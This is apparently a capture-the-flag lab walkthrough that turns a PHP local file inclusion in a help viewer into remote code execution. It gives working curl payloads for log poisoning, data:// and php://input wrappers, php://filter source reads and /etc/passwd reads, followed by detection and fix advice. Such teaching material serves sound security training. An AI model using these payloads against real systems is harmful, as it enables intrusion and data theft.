# C09 · Station D — LFI → RCE · ★★★☆

> **Chapter:** [[Chapter-09-Overview]] · **Next:** [[C09-Station-E-SSTI-Twig]]
> **Host:** `hollow-portal-01` (`target-web`) · **Target:** `/view.php?page=` (the help viewer)
> **The bug:** the help viewer `include`s whatever path `page` names. `include` **executes** PHP — so an LFI becomes RCE once you get PHP into something it can include.

One primitive, four techniques: arbitrary read, source disclosure, log poisoning, and wrapper RCE.

---

## 1. Exploit — do this first

The headline: **poison the Apache access log, then include it.**

```bash
# 1) write PHP into the access log via the User-Agent. Single quotes —
#    Apache escapes " in the combined log, which would break a $_GET["c"].
attacker$ curl -A "<?php system(\$_GET['c']); ?>" http://target-web/

# 2) include the log and drive it with ?c=
attacker$ curl -G http://target-web/view.php \
  --data-urlencode 'page=/var/log/apache2/access.log' \
  --data-urlencode 'c=id; cat /var/www/flag.txt'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
R2R{w3b_rce_is_your_front_d00r}
```

| Token | What it does |
|---|---|
| `-A "<?php …'c'… ?>"` | sets the `User-Agent`; Apache writes it verbatim into `access.log` |
| `$_GET['c']` | single-quoted key — survives the log's `"`-escaping |
| `page=/var/log/apache2/access.log` | `include` the log; PHP in it executes |
| `c=id; cat …` | the command the poisoned line runs, as `www-data` |

---

## 2. How you find it

```bash
attacker$ curl 'http://target-web/view.php?page=/etc/passwd' | grep root:x:0
root:x:0:0:root:/root:/bin/bash
```

`page` is a **path**, not a page name, and `/etc/passwd` comes straight back → Local File Inclusion. Confirm source disclosure with a filter wrapper (base64 so the source is returned, not executed):

```bash
attacker$ curl 'http://target-web/view.php?page=php://filter/convert.base64-encode/resource=prefs.php' \
  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d        # read prefs.php's source
```

---

## 3. Why it works

```php
$page = $_GET['page'] ?? 'pages/home.php';
include $page;      // no base dir, no sanitisation
```

`include` compiles and runs PHP from whatever stream it is handed. If you can get PHP source into *any* file or stream it can reach, that source **executes**:

- a **log** you can write to through a request header (log poisoning),
- a **wrapper** that carries your bytes — `data://` or `php://input` — enabled here because `php.ini` ships `allow_url_include=On` (a planted mistake):

```bash
# data:// — PHP in a base64 data URI
B64=$(printf '%s' '<?php system("cat /var/www/flag.txt"); ?>' | base64)
curl -G http://target-web/view.php --data-urlencode "page=data://text/plain;base64,${B64}"

# php://input — PHP in the POST body
curl -X POST --data '<?php system("id"); ?>' 'http://target-web/view.php?page=php://input'
```

`php://filter/convert.base64-encode` is the same primitive run *backwards*: it returns the resource as base64 **data**, so you read source you otherwise couldn't.

---

## 4. Pitfalls

- **Use single quotes in the log payload.** Apache's combined log wraps the User-Agent in `"` and escapes any `"` inside as `\"`, which breaks `$_GET["c"]`. `$_GET['c']` logs and parses cleanly.
- **One parse error in the log breaks the whole include.** If you poisoned with a broken payload earlier, the include aborts — `make reset-web` for a clean log.
- **Reading vs running:** to *read* PHP source use `php://filter` (base64); a plain include would execute it and show nothing.
- **`data://` / `php://input` need `allow_url_include=On`** — true here, off by default in the real world.

---

## 5. Detect & fix

- **Detect:** parameters containing `php://`, `data://`, `../`, or absolute log paths; a `User-Agent` with `<?php` in the access log; `include()` warnings naming attacker paths. Recipes in [[Blue-Team-Playbook]].
- **Fix:** never `include` user input — map `page` to an **allow-list** of known files; set `allow_url_include=Off` and `allow_url_fopen=Off`; lock log perms (`0640 root:adm`, dir `0750`) and keep `open_basedir` tight. More in [[Blue-Team-Playbook]].

---

## 6. What you learned

- `include` is code execution, not file reading — LFI is RCE the moment you can plant PHP anywhere it reaches.
- Log poisoning and PHP wrappers are the two reliable "plant PHP" tricks; `php://filter` reads source.
- Next, code execution through a template engine: [[C09-Station-E-SSTI-Twig]].

> Next: [[C09-Station-E-SSTI-Twig]] · Related: [[C09-Station-A-Unrestricted-Upload]] · [[Blue-Team-Playbook]]
